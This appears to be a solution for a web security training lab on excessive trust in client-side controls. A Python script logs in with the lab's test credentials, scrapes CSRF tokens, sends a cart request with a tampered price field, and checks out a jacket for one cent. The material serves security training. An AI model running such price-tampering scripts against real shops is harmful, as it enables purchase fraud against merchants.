# Excessive trust in client-side controls
> This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".
> You can log in to your own account using the following credentials: `wiener:peter`

```python
import requests
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "https://0a28007204b55c058279601700f50067.web-security-academy.net/"

def exploit_logic_flaw(url):
    session = requests.Session()
    
    # 1. Login Phase
    login_endpoint = url + "login"
    response = session.get(login_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    login_creds = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }
    
    response = session.post(login_endpoint, data=login_creds)
    
    if "Log out" in response.text:
        print("[+] SUCCESSFULLY LOGGED IN")

        # 2. Add to Cart Phase (Exploiting Logic Flaw)
        cart_endpoint = url + "cart"
        cart_payload = {
            "productId": 1,
            "redir": "PRODUCT",
            "quantity": 1,
            "price": 1  # Logic Flaw: Arbitrarily setting the price to 1 cent
        }
        
        response = session.post(cart_endpoint, data=cart_payload)
        
        if response.status_code in [200, 302]:
            print("[+] PRICE TAMPERED SUCCESSFULLY AND ADDED TO CART")
            
            # 3. Checkout Phase (Requires fresh CSRF token)
            response = session.get(cart_endpoint)
            soup = BeautifulSoup(response.text, 'html.parser')
            checkout_csrf = soup.find("input", {"name": "csrf"})['value']
            
            checkout_endpoint = url + "cart/checkout"
            checkout_payload = {
                "csrf": checkout_csrf
            }
            
            response = session.post(checkout_endpoint, data=checkout_payload)
            
            # 4. Verification
            if "Congratulations" in response.text:
                print("[+] LOGIC FLAW EXPLOIT SUCCESSFUL: Lab Solved")
            else:
                print("[-] Checkout failed.")

if __name__ == "__main__":
    exploit_logic_flaw(BASE_URL)
```